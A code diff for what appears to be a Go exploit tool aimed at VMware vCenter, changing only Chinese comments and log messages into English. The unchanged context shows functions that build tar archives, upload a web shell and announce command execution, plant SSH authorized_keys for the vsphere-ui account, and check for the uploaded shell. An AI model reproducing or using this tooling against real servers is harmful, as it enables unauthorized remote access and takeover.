@@ -15,12 +15,12 @@ import (
 )
 
 func Generate_tar(name string, o_name string, step string) bytes.Buffer {
-	// 创建一个缓冲区用来保存压缩文件内容
+	// create a buffer to store the compressed file content
 	var buf bytes.Buffer
-	// 创建一个压缩文档
+	// create an archive
 	tw := tar.NewWriter(&buf)
-	// 定义一堆文件
-	// 将文件写入到压缩文档tw
+	// define a bunch of files
+	// write the files into the archive tw
 	tar_file_name := ""
 	// filename := ""
 	if o_name == "windows" {
@@ -60,7 +60,7 @@ func Generate_tar(name string, o_name string, step string) bytes.Buffer {
 		return buf
 	}
 
-	// // 将压缩文档内容写入文件 file.tar.gz
+	// // write the compressed content into the file file.tar.gz
 	// f, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0666)
 	// if err != nil {
 	// 	log.Fatal(err)
@@ -97,7 +97,7 @@ func Upload_shell2(szUrl string, buf bytes.Buffer) (string, bool) {
 				}
 			}
 			if resp.StatusCode == 200 {
-				fmt.Println("[+] 上传成功，开始命令执行.")
+				fmt.Println("[+] Upload successful, starting command execution.")
 			}
 		}
 	}, func() map[string]string {
@@ -140,7 +140,7 @@ func Upload_ssh_authorized_keys(szUrl, tar_content string) string {
 		if output, err := cmd.Output(); nil == err {
 			res := strings.Replace((string(output)), "\n", "", 1)
 			if res == "vsphere-ui" {
-				s1 = "上传成功: ssh " + szCmd
+				s1 = "Upload successful: ssh " + szCmd
 				log.Println(s1)
 				return s1
 			}
@@ -166,7 +166,7 @@ func Check_shell(szUrl string, os_name string) string {
 		if nil != resp {
 			if resp.StatusCode == 200 {
 				shell_url = szU
-				fmt.Println("[+] 上传成功，开始命令执行.")
+				fmt.Println("[+] Upload successful, starting command execution.")
 			}
 			io.Copy(io.Discard, resp.Body)
 		} else {
